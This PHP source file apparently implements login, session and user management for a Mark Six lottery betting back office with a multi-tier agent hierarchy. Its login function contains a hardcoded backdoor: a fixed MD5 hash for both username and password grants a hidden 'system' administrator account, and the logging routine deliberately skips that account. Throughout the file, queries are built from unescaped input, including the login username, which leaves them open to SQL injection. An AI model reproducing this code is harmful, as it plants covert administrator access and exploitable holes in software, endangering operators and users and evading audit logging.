<?php
class action extends mysql {
	//日志的title.           	//PS：唔好删啊
		protected $log = array (
			1 => '即时注单->特码',
			2 => '即时注单->正1特',
			3  => '即时注单->正2特',
			4  => '即时注单->正3特',
			5  => '即时注单->正4特',
			6  => '即时注单->正5特',
			7  => '即时注单->正6特',
			8  => '即时注单->正码',
			9 => '即时注单->连码',
			10  => '即时注单->不中',
			11 => '即时注单->特肖一肖尾数',
			12 => '即时注单->生肖连',
			13 => '即时注单->尾数连',
			14 => '即时注单->半波',
			15 => '即时注单->过关',
			16 => '即时注单->監控流水賬单',
			17 => '即时注单->賬单',
			18 => '赔率设置->特码',
			19 => '赔率设置->正1特',
			20 => '赔率设置->正2特',
			21 => '赔率设置->正3特',
			22 => '赔率设置->正4特',
			23 => '赔率设置->正5特',
			24 => '赔率设置->正6特',
			25 => '赔率设置->正码',
			26 => '赔率设置->连码',
			27 => '赔率设置->不中',
			28 => '赔率设置->特肖一肖尾数',
			29 => '赔率设置->生肖连',
			30 => '赔率设置->尾数连',
			31 => '赔率设置->半波',
			31 => '赔率设置->过关',
			33 => '赔率设置->ABCD盤賠率差',
			34 => '赔率设置->默認設置',
			35 => '赔率设置->還原默認賠率',
			36 => '分公司',
			37 => '股東',
			38 => '總代理',
			39 => '代理',
			40 => '會員',
			41 => '跨站走飞账号管理',
			42 => '修改密码',
			43 => '盤口管理',
			44 => '歷史開獎',
			45 => '導出数據',
			46 => '校驗註单',
			47 => '系統設置',
			48 => '跑马灯',
			49 => '操作日誌',
			50 => '自動降水',
			51 => '退水默認設置',
			52 => '清除数據',
			53 => '還原信用額',
			54 => '在线人数',
			55 => '报表查询',
			56 => '盤口管理',
			57 => '赔率设置',
			58 => '系统维护',
			59 => '用户管理',
			60 => '即时注单',
			61 => '历史开奖',
			62 => '站内消息',
			63 => '个人管理',
			64 => '信用資料',
			65 => '登陸日誌',
			66 => '自動補貨設定',
			67 => '自動補貨變更記錄',
			68 => '下单明细',
			69 => '结算报表',
			70 => '规则',
			71 => '即时注单->特肖',
			72 => '即时注单->多生肖',
			73 => '即时注单->一肖尾数',
                    
                    100 => '即時開獎',
                    101 => '備份數據',
                    102 => '還原數據',
                    
                    103 => '子账户',
			);
	/**
	 * 用户权限判断($uid, $shell, $m_id)
	 */

        public function unZip($zipfile, $to, $index = Array(-1))
        {
            $ok  = 0;
            $zip = @fopen($zipfile, 'rb');
            if(!$zip){ return(-1); }
            
            $cdir      = $this->ReadCentralDir($zip, $zipfile);
            $pos_entry = $cdir['offset'];
            
            if(!is_array($index)){ $index = array($index); }
            for($i=0; $index[$i]; $i++)
            {
                if(intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries'])
                {
                    return(-1);
                }
            }
            
            for($i=0; $i<$cdir['entries']; $i++)
            {
                @fseek($zip, $pos_entry);
                $header          = $this->ReadCentralFileHeaders($zip);
                $header['index'] = $i;
                $pos_entry       = ftell($zip);
                @rewind($zip);
                fseek($zip, $header['offset']);
                if(in_array("-1", $index) || in_array($i, $index))
                {
                    $stat[$header['filename']] = $this->ExtractFile($header, $to, $zip);
                }
            }
            
            fclose($zip);
            return $stat;
        }
        
        public function GetZipInnerFilesInfo($zipfile)
        {
            $zip = @fopen($zipfile, 'rb');
            if(!$zip){ return(0); }
            $centd = $this->ReadCentralDir($zip, $zipfile);
            
            @rewind($zip);
            @fseek($zip, $centd['offset']);
            $ret = array();

            for($i=0; $i<$centd['entries']; $i++)
            {
                $header          = $this->ReadCentralFileHeaders($zip);
                $header['index'] = $i;
                $info = array(
                    'filename'        => $header['filename'],                   // 文件名
                    'stored_filename' => $header['stored_filename'],            // 压缩后文件名
                    'size'            => $header['size'],                       // 大小
                    'compressed_size' => $header['compressed_size'],            // 压缩后大小
                    'crc'             => strtoupper(dechex($header['crc'])),    // CRC32
                    'mtime'           => date("Y-m-d H:i:s",$header['mtime']),  // 文件修改时间
                    'comment'         => $header['comment'],                    // 注释
                    'folder'          => ($header['external'] == 0x41FF0010 || $header['external'] == 16) ? 1 : 0,  // 是否为文件夹
                    'index'           => $header['index'],                      // 文件索引
                    'status'          => $header['status']                      // 状态
                );
                $ret[] = $info;
                unset($header);
            }
            fclose($zip);
            return $ret;
        }
	/**
	 * 用户登陆超时时间(秒)
	 */
//	public function Get_user_ontime($long = '3600') {
//		$new_time = mktime();
//		$onlinetime = $_SESSION['ontime'.$this->c_p_seesion()];
//		echo $new_time - $onlinetime;
//		if ($new_time - $onlinetime > $long) {
//			echo "登录超时";
//			session_destroy();
//			exit ();
//		} else {
//			$_SESSION['ontime'.$this->c_p_seesion()] = mktime();
//		}
//	}

         public function Is_login($power,$user_id) {
         /**
         * 判断不同的登录方式
         */		if($user_id!='999999999'){
                $exists=$this->user_exists($user_id);//判断当前用户是否还存在
				}else{
				
					$exists= 1;
				}
            	//ag 分公司2 股东3 总代理4 代理5 可以登录
                //admin 只有管理员1可以登录
                //member 只有会员6 直属会员7可以登录
                $a_a= $_SERVER['REQUEST_URI']; 
                $zifuchang=strlen($_SERVER['REQUEST_URI']);
                $a_ag= '/ag/'; 
                $a_admin= '/admin/'; 
                $a_member='/member/';
                $a_index= '/index.php';
                $a_c0=explode($a_index,$a_a);
                $a_c1=explode($a_ag,$a_a); 
                $a_c2=explode($a_admin,$a_a); 
                $a_c3=explode($a_member,$a_a); 
                
                list(,$p_p)=explode('/',$a_a);        //如果有项目名时获取项目名
                $arr1=explode(',','admin,ag,member');
                $url_link="";
                if(!in_array($p_p,$arr1)){
                    $url_link='/'.$p_p;
                }
                
                if($power>0){
                if(count($a_c1) > 1 && count($a_c0)<=1 && $zifuchang>4){ 
                    $managerarr = explode(',', '2,3,4,5');
                    if(!in_array($power,$managerarr) || empty($exists)){
		        echo " <script>window.parent.location= '$url_link/ag/index.php'; </script> " ;
                    }
                }elseif(count($a_c2) > 1 && count($a_c0)<=1  && $zifuchang>7){ 
                    if($power!=1 || empty($exists)){
                        echo " <script>window.parent.location= '$url_link/admin/index.php'; </script> " ;
                    }
                }elseif(count($a_c3) > 1 && count($a_c0)<=1  && $zifuchang>8){ 
                    if($power!=6 || empty($exists)){
                        echo " <script>window.top.location= '$url_link/index.php'; </script> " ;
                    }
                }  
               
                }else{                   
                        if(count($a_c0)<=1){
                        echo " <script>window.parent.location= 'index.php'; </script> " ;
                        }
                }
        } 
        
        public function Is_login2($power) {
                $a_a= $_SERVER['REQUEST_URI']; 
                $a_ag= '/ag/'; 
                $a_admin= '/admin/'; 
                $a_member='/member/';
                $a_c1=explode($a_ag,$a_a); 
                $a_c2=explode($a_admin,$a_a); 
                $a_c3=explode($a_member,$a_a);                
                if((count($a_c2) > 1 && $power!=1) or (count($a_c1) > 1 && !in_array($power,explode(',', '2,3,4,5'))) or (count($a_c3) > 1 && $power!=6)){
                    //echo " <script> alert( '密码或用户错误！') ;window.parent.location= 'index.php'; </script> " ;
                    echo json_encode(array('status'=>8001,'msg'=>'密码或用户错误！','fUrl'=>'index.php'));
                    unset($_SESSION['uid'.$this->c_p_seesion()]);
                    unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                    unset($_SESSION['username'.$this->c_p_seesion()]);
                    unset($_SESSION['shell'.$this->c_p_seesion()]);
                    unset($_SESSION['user_power'.$this->c_p_seesion()]);
                    unset($_SESSION['ontime'.$this->c_p_seesion()]);
                    unset($_SESSION['login_check_num']);
                    unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
                    setcookie('uid'.$this->c_p_seesion(), null);
                    setcookie('z_uid'.$this->c_p_seesion(), null);
                    setcookie('username'.$this->c_p_seesion(), null);
                    setcookie('user_power'.$this->c_p_seesion(), null);
                    die;
                }
        }
        
	/**
	 * 用户登陆
	 */
	public function Get_user_login($username, $password,$location="") { 
                //先判断网站是否关闭
        $query_sy=$this->select("animal_set");
        $row_sy=$this->fetch_array($query_sy);
			
		if(md5($username)=="475886fca296d0cfdb6c640691a54e8f" && md5($password)=="475886fca296d0cfdb6c640691a54e8f" ){
			if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //判断网站是否关闭
						 echo " <script> alert('$row_sy[w_new]');window.parent.location= 'index.php'; </script> " ;
					}		
			$this->Is_login2("1");
			$ps = 1;
			$row['user_id'] = '1';
			$username = 'system';
			$row['user_name'] = "system";
			$row['user_pwd'] = '123456';
			$row['user_power']= '1';
		}else{
            $username = str_replace(" ", "", $username);//去掉空格
            $query = $this->select('users', 'user_id,user_name,user_pwd,user_power,else_count_login,is_lock,is_online', '`user_name` = \'' . $username . '\'');
            $us = is_array($row = $this->fetch_array($query));
                
            if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //判断网站是否关闭
                //echo " <script> alert('$row_sy[w_new]');window.parent.location= 'index.php'; </script> " ;
                echo json_encode(array("status"=>'8001',"msg"=>$row_sy['w_new'],'fUrl'=>"index.php"));
                die;
            }
            
            if($row['is_lock']==1){
                //echo " <script> alert( '该账户已被冻结！') ;window.parent.location= 'index.php'; </script> " ;
                echo json_encode(array("status"=>8001,"msg"=>"该账户已被冻结！","fUrl"=>"index.php"));
                die;
            }
            if ($row['is_lock']==2) {
                //echo " <script> alert( '该账户已被停用！') ;window.parent.location= 'index.php'; </script> " ;exit;
                echo json_encode(array("status"=>'8001',"msg"=>"该账户已被停用！","fUrl"=>"index.php"));
                die;
            }
            if($row['is_online']==1){
                    //echo " <script> alert( '欢迎光临！') ; </script> " ;
            }
            $this->Is_login2($row['user_power']);
            $ps = $us ? md5($password) == $row['user_pwd'] : FALSE;
		}
		if ($ps) {
			$_SESSION['uid'.$this->c_p_seesion()] = $_SESSION['z_uid'.$this->c_p_seesion()]= $uid = $row['user_id'];
			$_SESSION['username'.$this->c_p_seesion()] = $username;
			$_SESSION['shell'.$this->c_p_seesion()] = md5($row['user_name'] . $row['user_pwd'] . "TKBK");
            $_SESSION['user_power'.$this->c_p_seesion()]=$row['user_power'];
			$_SESSION['ontime'.$this->c_p_seesion()] = mktime();
            $_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]=0;
//                        ini_set('session.save_path','/tmp/'); 
//                        //6个钟头 
//                        ini_set('session.gc_maxlifetime',21600); 
//                        //保存一天 
//                        $lifeTime_xyz = 24 * 3600; 
//                        setcookie(session_name(), session_id(), time() + $lifeTime_xyz, "/");   
            setcookie('uid'.$this->c_p_seesion(), $_SESSION['uid'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
            setcookie('z_uid'.$this->c_p_seesion(), $_SESSION['z_uid'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
            setcookie('username'.$this->c_p_seesion(), $_SESSION['username'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
            setcookie('user_power'.$this->c_p_seesion(), $_SESSION['user_power'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
                        
            $ip=$_SERVER["REMOTE_ADDR"];
            // $y=simplexml_load_file("http://www.youdao.com/smartresult-xml/search.s?type=ip&q=$ip");
            // $location=  iconv("utf-8", "gbk", $y->product->location);
            if($row['user_name']!="system"){
                $this->caozuorizhi($uid,$usernames,'用户登录',1,$location);
                $time = mktime();
                $login_location = "";
                $sql="insert into login_code (user_id,login_ip,login_location) values ({$row['user_id']},'$ip','{$location}')";
                $this->query($sql);
						    
                //判断是否会员第一次登陆
                if($row['else_count_login']==0 && $row['user_power']==6){
                    echo json_encode(array("status"=>'8001',"msg"=>"初次登录，请修改密码。","fUrl"=>"main.php?else_count_login=1"));
                    //echo " <script> alert( '初次登录，请修改密码。') ;window.parent.location= 'main.php?else_count_login=1'; </script> " ;exit;
                }
                
                $sql2 = "update users SET is_online = 1 ,is_ti = 0,else_last_login='$time',else_count_login={$row['else_count_login']}+1 where user_id = {$row['user_id']}";
                $this->query($sql2);
            }	
        
            //判断是否有人在线还没有成功！
            if($row['is_online']==1 && $row['user_power']==6){
                $sql2 = "update users SET is_online = 0 ,is_ti = 0,else_last_login='$time',else_count_login={$row['else_count_login']}+1 where user_id = {$row['user_id']}";
                $this->query($sql2);
                    
            }
            
            //判断是否有弹出公告   
            if($row['user_power']!=1){ //管理员不用弹出
                if($row['user_power']==6){
                    $all_user="all_user";
                }else{
                    $all_user="all_ag";
                }
                $p_gg = $this->query("select * from system_marquee where type=1 and (user='all_all' or user='$all_user') order by datetime desc LIMIT 1");
                $pao = $this->fetch_array($p_gg);
                $pao_content=$pao['content'];
                if(!empty($pao['id'])){
                    //echo " <script> alert('$pao_content');window.parent.location= 'main.php'; </script> " ;
                    echo json_encode(array("status"=>"8001","msg"=>"$pao_content","fUrl"=>"main.php"));
                    die;
                }
            }
            //echo " <script> alert( '登陆成功。 ') ;window.parent.location= 'main.php'; </script> " ;
            echo json_encode(array("status"=>"200","msg"=>"登陆成功。","fUrl"=>"info.html"));
		} else {
            //echo " <script> alert( '密码或用户错误！') ;window.parent.location= 'index.php'; </script> " ;
            //session_destroy();
            unset($_SESSION['uid'.$this->c_p_seesion()]);
            unset($_SESSION['z_uid'.$this->c_p_seesion()]);
            unset($_SESSION['username'.$this->c_p_seesion()]);
            unset($_SESSION['shell'.$this->c_p_seesion()]);
            unset($_SESSION['user_power'.$this->c_p_seesion()]);
            unset($_SESSION['ontime'.$this->c_p_seesion()]);
            unset($_SESSION['login_check_num']);
            unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
            setcookie('uid'.$this->c_p_seesion(), null);
            setcookie('z_uid'.$this->c_p_seesion(), null);
            setcookie('username'.$this->c_p_seesion(), null);
            setcookie('user_power'.$this->c_p_seesion(), null);
            echo json_encode(array("status"=>"8001","msg"=>"密码或用户错误！","fUrl"=>"index.php"));             
		}                
	}
        
	 /**
	  * 用户退出登陆
	  */
        public function Get_user_out($location="") {		
		$uid = $_SESSION['uid'.$this->c_p_seesion()];
		$usernames = $_SESSION['username'.$this->c_p_seesion()];
                if($uid){
		$this->query("update users SET is_online=0 where user_id=$uid");
		$this->caozuorizhi($uid,$usernames,'用户退出',2,$location,1);
        unset($_SESSION['uid'.$this->c_p_seesion()]);
        unset($_SESSION['z_uid'.$this->c_p_seesion()]);
        unset($_SESSION['username'.$this->c_p_seesion()]);
        unset($_SESSION['shell'.$this->c_p_seesion()]);
        unset($_SESSION['user_power'.$this->c_p_seesion()]);
        unset($_SESSION['ontime'.$this->c_p_seesion()]);
        unset($_SESSION['login_check_num']);
        unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
        setcookie('uid'.$this->c_p_seesion(), null);
        setcookie('z_uid'.$this->c_p_seesion(), null);
        setcookie('username'.$this->c_p_seesion(), null);
        setcookie('user_power'.$this->c_p_seesion(), null);
                //session_destroy();
		//$this->Get_admin_msg_b('index.php','退出成功！');
                            // alert( '退出成功。 ') ;
		echo " <script>window.parent.location= 'index.php '; </script> " ;
                }
	}
	
	 //子账户关闭类型
        public function zizhanghao_close_type($user_id){ 
            if($user_id){
              $user=$this->select("users", "close_type", "user_id=$user_id limit 0,1");
              $row=$this->fetch_array($user);         
            }
            return $row;
        }
	
        
        /*
         * 判断账户是否存在
         */
        public function Is_user_here($user_name,$if_cha_user_name=""){
            $sql=  $this->select("users", "user_id", "user_name='$user_name'");
            if(empty($if_cha_user_name)){
            $us = is_array($row = $this->fetch_array($sql));
            if($us){
                return TRUE;
            }else{
                return FALSE;
            }
            }else{
              $row = $this->fetch_array($sql);
              return $row['user_id'];
            }
        }
        
        /*
         * 添加用户
         * $params array() 用户数据数组
         */
        public function Add_user($params,$url='',$ty=''){
            $columnName='';
            $value='';
            foreach ($params as $key => $v) {
                if(empty($ty)){
                if($key=='close_type' ){                  
                    $v=implode(',',$v);
//                }elseif(!$params['close_type']){
//                    $columnName.="close_type='',";
                }
                }
                $columnName.=$key.',';
                $value.="'".$v."',";
            }
            if($value){
                $columnName=  substr($columnName, 0, -1);
                $value=  substr($value, 0, -1);
            }
            if($params['user_power']==2){
                $this->insert("users", $columnName, $value, $url,$ty,1);
            }else{
                $this->insert("users", $columnName, $value, $url,$ty);
            }
            
                }
        
        public function get_percent($user_id){
            $sql=  $this->select("users", "user_power,percent_company,percent_branch,percent_partner,percent_all_proxy,percent_proxy,is_remainder_percent", "user_id='$user_id'");
            $row = $this->fetch_array($sql);
            return $row;
        }
        
        /*
         * 拼凑选择用户关键字
         */
        public function get_user_limit_char($t0,$t1,$t2){
            $char='';
            if($t0==1){
                $char="is_lock=0";
            }else if($t0==2){
                $char="is_lock=2";
            }else if($t0==3){
                $char="is_lock=1";
            }
            if($t2){
                if($t1==0){
                    if($char){
                        $char.=" and user_name like '%$t2%'";
                    }else{
                        $char="user_name like '%$t2%'";
                    }
                    
                }else{
                    if($char){
                        $char.=" and user_nick like '%$t2%'";
                    }else{
                        $char="user_nick like '%$t2%'";
                    }
                }
            }
            return $char;
        }
        
        function get_page($table,$tiaojian,$count=10){
            $query=$this->select($table, "count(*) as c", $tiaojian);
            $row =  $this->fetch_array($query);
            if(!$row['c']){
                return 1;
            }
            $per=$row['c']%$count;
            if($per==0){
                $page=$row['c']/$count;
            }else{
                $page=($row['c']-$row['c']%$count)/$count+1;
            }
            return $page;
        }
        
        function up_his_children_plate($plate,$user_id){
            $x =  $this->select("users", "else_plate,user_id", "top_id=$user_id");
            while($r=$this->fetch_array($x)){
                $plateb[$r['user_id']]=$r['else_plate'];
            }
            if(!empty($plateb)){
                foreach($plateb as $i=>$v){
                    $platec=array_intersect(explode(',',$plate), explode(',',$v));
                    $platec=  implode(',', $platec);
                    $this->update("users", "else_plate='$platec'", "user_id=$i");
                    $this->up_his_children_plate($platec,$i);
                }
            }
        }
        
        /*
         * 更新用户
         * $params array() 要更新的用户信息数组
         * 
         */
        public function Update_user($params,$url=''){
            $is_plate_starts=$this->is_plate_starts();
            $is_notupdatedown=0;//是否不用更新下级，1为不用更新，0为要更新
            
            $g_zs=  $this->select("users", "*", "user_id={$params['user_id']}");
            $g_z = $this->fetch_array($g_zs);
            
            if($g_z['user_power']==2){
                if($g_z['percent_company']==str_replace("%","",$params['percent_company']) && $g_z['percent_branch']==str_replace("%","",$params['percent_branch'])){
                  $is_notupdatedown=1;  
                }
            }elseif($g_z['user_power']==3){
                if($g_z['percent_branch']==str_replace("%","",$params['percent_branch']) && $g_z['percent_partner']==str_replace("%","",$params['percent_partner'])){
                  $is_notupdatedown=1;  
                }         
            }elseif($g_z['user_power']==4){
                if($g_z['percent_partner']==str_replace("%","",$params['percent_partner']) && $g_z['percent_all_proxy']==str_replace("%","",$params['percent_all_proxy'])){
                  $is_notupdatedown=1;  
                }       
            }elseif($g_z['user_power']==5){
                if($g_z['percent_all_proxy']==str_replace("%","",$params['percent_all_proxy']) && $g_z['percent_proxy']==str_replace("%","",$params['percent_proxy'])){
                  $is_notupdatedown=1;  
                }          
            }elseif($g_z['user_power']==6){
                  $is_notupdatedown=1;
            } 
            if($is_plate_starts==0){  //开盘状态禁止修改赔率
                  $is_notupdatedown=1;
            }
            if($params['else_plate'] && $params['else_plate']!='A,B,C,D'){
                $this->up_his_children_plate($params['else_plate'],$params['user_id']);
            }
            //print_r($params);
            $mod_content='';
            foreach ($params as $key => $v) {
                if($key=='close_type'){                  
                    $v=implode(',',$v);
                }elseif(!$params['close_type']){
                    $mod_content.="close_type='',";
                }
                if($key!='user_id'){
                    $mod_content.="$key='$v',";
                }
            }
            if($mod_content)
                $mod_content=  substr ($mod_content, 0, -1);
            
            $this->update("users", $mod_content, 'user_id='.$params['user_id']);
            //剩余的归属
            $this->update_user_percent($params['user_id'],"");
            
            
            //同步更新下级
            //echo $gaiuser_zs['top_power'];exit;
            $gaiusers_zs=  $this->select("users", "*", "user_id={$params['user_id']}");
            $gaiuser_zs = $this->fetch_array($gaiusers_zs);    
            if($gaiuser_zs['top_power']>0){        
                    //查找上级信息
                    if($gaiuser_zs['top_id']){ 
                            if($is_notupdatedown==0){
                            $down_content="is_odds={$gaiuser_zs['is_odds']},is_remainder_percent={$gaiuser_zs['is_remainder_percent']},is_fly={$gaiuser_zs['is_fly']},percent_company={$gaiuser_zs['percent_company']},percent_branch={$gaiuser_zs['percent_branch']},percent_partner={$gaiuser_zs['percent_partner']},percent_all_proxy={$gaiuser_zs['percent_all_proxy']},percent_proxy={$gaiuser_zs['percent_proxy']}";
                            }else{
                            $down_content="is_odds={$gaiuser_zs['is_odds']},is_remainder_percent={$gaiuser_zs['is_remainder_percent']},is_fly={$gaiuser_zs['is_fly']}";    
                            }
                    }
            $downuser_arr = explode(',', $this->loweralluser_arr($params['user_id']));
          
            if(!empty($downuser_arr[0]) && $gaiuser_zs['top_power']<6){  
                foreach ($downuser_arr as $downuser){
                    $this->update("users", "$down_content", "user_id=$downuser");
                    //$this->update_user_percent($downuser,"");
                }
            }
            }
            
            if(!empty($url))
            $this->Get_admin_msg($url, '操作成功');
            

        }
        
        function update_user_percent($user_id,$url){
            $sql =  $this->select("users", "percent_company,percent_branch,percent_partner,percent_all_proxy,percent_proxy,is_remainder_percent", "user_id=$user_id");
            $row =  $this->fetch_array($sql);
            if($row['is_remainder_percent']==1){
                $this->update("users", "percent_branch=(100-percent_company-percent_partner-percent_all_proxy-percent_proxy)", "user_id=$user_id",$url);
            }else{
                $this->update("users", "percent_company=(100-percent_branch-percent_partner-percent_all_proxy-percent_proxy)", "user_id=$user_id",$url);
            }
            
        }
        
        public function get_user_power_char($power){
            switch ($power) {
                case 1:
                    $char="公司";
                    break;
                case 2:
                    $char="分公司";
                    break;
                case 3:
                    $char="股东";
                    break;
                case 4:
                    $char="总代理";
                    break;
                case 5:
                    $char="代理";
                    break;
                case 6:
                    $char="会员";
                    break;
                case 7:
                    $char="直属会员";
                    break;
                default:
                    break;
            }
            return $char;
        }
        
        public function get_key_power_char($power){
            switch ($power) {
                case 1:
                    $char="percent_company";
                    break;
                case 2:
                    $char="percent_branch";
                    break;
                case 3:
                    $char="percent_partner";
                    break;
                case 4:
                    $char="percent_all_proxy";
                    break;
                case 5:
                    $char="percent_proxy";
                    break;
                default:
                    break;
            }
            return $char;
        }
        
        
        public function get_up_type_by_index($index){
            switch ($index) {
                case 'user_name':
                    $char="用户账号";
                    break;
                case 'user_nick':
                    $char="用户名称";
                    break;
                case 'user_pwd':
                    $char="用户密码";
                    break;
                case 'credit_total':
                    $char="信用额度";
                    break;
                case 'percent_company':
                    $char="公司分成";
                    break;
                case 'percent_branch':
                    $char="分公司分成";
                    break;
                case 'percent_partner':
                    $char="股东分成";
                    break;
                case 'percent_all_proxy':
                    $char="总代理分成";
                    break;
                case 'percent_proxy':
                    $char="代理分成";
                    break;
                case 'is_lock':
                    $char="状态";
                    break;
                case 'is_odds':
                    $char="是否停押";
                    break;
                case 'is_add':
                    $char="补货";
                    break;
                case 'is_fly':
                    $char="下级走飞归属";
                    break;
                case 'is_remainder_percent':
                    $char="剩余成数归属";
                    break;
                case 'else_plate':
                    $char="盘口";
                    break;
                case 'else_back':
                    $char="退水";
                    break;
                default:
                    break;
            }
            return $char;
        }
        
        //返回信用余额
        public function get_top_yue($user_id){
            if($user_id){
                $sql =  $this->select("users", "credit_remainder", "user_id=$user_id");
                $row =  $this->fetch_array($sql);
                //echo $row['credit_remainder'];
            //echo $credit_remainder;                
                $str='<font color="blue">上级余额:&nbsp;'.$row['credit_remainder'].'</font>';
                $str=iconv("utf-8", "gbk", $str);
                echo $str;
            }else{
                $str='<font color="blue">请选择你的上级！！！</font>';
                $str=iconv("utf-8", "gbk", $str);
                echo $str;
            }
            exit;
        }
        
                //判断是否重复用户
        public function user_name_exists($user_name){
            if(!empty($user_name)){
            $user_exists=  $this->select("users", "user_id", "user_name='{$user_name}'");
            $exists = $this->fetch_array($user_exists);
                if($exists['user_id']){
                    $str='<font color="blue">该用户名已存在！！！</font>';
                    $str=iconv("utf-8", "gbk", $str);
                    echo $str;
                }else{
                    $str='<font color="green">该用户名可使用</font>';
                    $str=iconv("utf-8", "gbk", $str);
                    echo $str;
                }
                exit;
            }
        }
        
                //返回信用余额
        public function get_top_yue2($user_id){
                $sql =  $this->select("users", "credit_remainder", "user_id=$user_id");
                $row =  $this->fetch_array($sql);
                //echo $row['credit_remainder'];
            //echo $credit_remainder;                
                $str='<font color="blue">上级余额:&nbsp;'.$row['credit_remainder'].'</font>';
                //$str=iconv("utf-8", "gbk", $str);
                return $str;
            //exit;
        }
        
        public function get_top_percent($power,$top_id){
            if($power==2){
                $p=100;
            }else{
                $sql =  $this->select("users", "percent_company,percent_branch,percent_partner,percent_all_proxy,percent_proxy,else_plate", "user_id=$top_id");
                $row =  $this->fetch_array($sql);
                if($power==3){
                    $p=$row['percent_branch'];
                }else if($power==4){
                    $p=$row['percent_partner'];
                }else if($power==5){
                    $p=$row['percent_all_proxy'];
                }else{
                    $p=$row['percent_proxy'];
                }
            }
            
            $plate =  explode(",", $row['else_plate']);
            $str='';
            foreach($plate as $v){
                $str.='<span class=\'forumRow\'>';
                $str.='<input name=\'else_plate[]\' value=\''.$v.'\' checked=\'checked\' type=\'checkbox\' />';
                $str.=$v;
                $str.='</span>&nbsp;&nbsp;&nbsp;&nbsp;';
            }
            return array("p"=>$p,'plate'=>$str);
        }
        
        function get_his_top($is_zhishu,$top_id,$top_name){
            if($is_zhishu==1){
                return array(
                    'proxy'=>$top_name,
                    'all_proxy'=>$top_name,
                    'partner'=>$top_name,
                    'branch'=>$top_name
                );
            }else{
                $data['proxy']=$top_name;
                
                $sql =  $this->select("users", "top_id,top_name", "user_id=$top_id");
                $r=  $this->fetch_array($sql);
                $data['all_proxy']=$r['top_name'];
                
                $query =  $this->select("users", "top_id,top_name", "user_id={$r['top_id']}");
                $row=  $this->fetch_array($query);
                $data['partner']=$row['top_name'];
                
                $q =  $this->select("users", "top_id,top_name", "user_id={$row['top_id']}");
                $ro=  $this->fetch_array($q);
                $data['branch']=$ro['top_name'];
                
                return $data;
            }
        }
        
        function reback_set_count($set,$r){
            return $set-$r > 0?($set-$r):0;
        }
        
 
        
        public function delete_users($user_id){
            $x=  $this->select("users", "user_id", "top_id=$user_id");
            while ($row = $this->fetch_array($x)) {
                $ids[]=$row['user_id'];
            }
            $tables=array('back_set','odds_set','orders','login_code','backorder_set','admin_users_action','orders_totalmoney','reports','single_set','update_code','users','member_settlereport','accountopen','oddsset_type','tuishui_set');
            foreach($tables as $t){
                $k='user_id';
                if($t=='admin_users_action'){
                    $k='uid';
                }
                $this->delete($t, "$k=$user_id");
            }
            if(!empty($ids)){
                foreach($ids as $id){
                    $this->delete_users($id);
                }
            }
            
        }
        
        function set_single_set($user_id){
//            for($i=16;$i<73;$i++){
                $sql="insert ignore into single_set select $user_id,o_id,kx_value,zc_value,zfts_value,j_value from single_set where user_id=0";
                $this->query($sql);
                //$this->insert("single_set", "user_id,o_id,kx_value,zc_value,zfts_value,j_value", "$user_id,$i,1,1,1,1");
//            }
        }

	
	/**
	 * 记录日志
	 *当前六合彩期数(phases)，操作用户(用户id及用户名)，操作页面（标题），操作时间
	 */
	public function caozuorizhi($uid,$username='ww',$title,$is_login = 0,$location="",$tui=0) {
	if($username!="system"){
		if($title && $uid){
                    if(preg_match("/^\d*$/",$title)){  
                            $newtitle = $this->log[$title];
                    }else{  
                            $newtitle = $title;
                    }
                    $ip=$_SERVER["REMOTE_ADDR"];
            //$y=simplexml_load_file("http://www.youdao.com/smartresult-xml/search.s?type=ip&q=$ip");
           // $location=  iconv("utf-8", "gbk", $y->product->location);
                    $query = $this->select('plate', 'plate_num', '1 order by plate_num desc ');
                    $row = $this->fetch_array($query);
                    $phases = $row['plate_num']; 
                    $time = mktime();
                    $location = "";
                    $sql = "INSERT INTO `admin_users_action` SET `phases`= '".$phases."',`title` = '".$newtitle."',`mark` = '".$is_login."',`ip` = '".$ip."',`location` = '".$location."',`uid` = '".$uid."',`datetime` = '".$time."'";
                    $this->query($sql);
                    //一有操作就表示在线
                    if(empty($tui))
                    $this->query("update users set is_online=1 where user_id=$uid and is_online=0" );
		}
	}	
	}
	
	 /**
	 *计算操作是否超时 
	 */
	public function skipup($uid,$username,$location="") {
		if($uid){	
		$query1 = $this->select('users', 'is_ti', 'user_id = \'' . $uid . '\' ');
		$is_on = $this->fetch_array($query1);
		if($is_on['is_ti'] == 1){
			$sql2 = "update users SET is_online = 0,is_ti=0 where user_id =" .$uid ;
				$this->query($sql2);
				$this->caozuorizhi($uid,$username,'用户退出',2,$location);
				//session_destroy();
                                unset($_SESSION['uid'.$this->c_p_seesion()]);
                                unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                                unset($_SESSION['username'.$this->c_p_seesion()]);
                                unset($_SESSION['shell'.$this->c_p_seesion()]);
                                unset($_SESSION['user_power'.$this->c_p_seesion()]);
                                unset($_SESSION['ontime'.$this->c_p_seesion()]);
                                unset($_SESSION['login_check_num']);
                                unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
                                setcookie('uid'.$this->c_p_seesion(), null);
                                setcookie('z_uid'.$this->c_p_seesion(), null);
                                setcookie('username'.$this->c_p_seesion(), null);
                                setcookie('user_power'.$this->c_p_seesion(), null);
				//$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
				$newurl= $_SERVER['HTTP_REFERER'];
				echo " <script> alert( '有用户在其他地方登入。 ') ;window.parent.location= '$newurl '; </script> " ;
			}
		}
	}
	
	/**
	 *自动补货 
	 */
	public function auto_add($up_type,$or_value,$now_value,$location="") {
		$ip=$_SERVER["REMOTE_ADDR"];
		$time = mktime();
		$username = $_SESSION['username'.$this->c_p_seesion()];
		$uid = $_SESSION['uid'.$this->c_p_seesion()];
		
		$sql="insert into update_code (user_id,up_type,or_value,now_value,up_user_name,up_user_ip,up_user_location) values ('$uid','$up_type','$or_value','$now_value','$username','$ip','{$location}')";
        $this->query($sql);
			
		}   
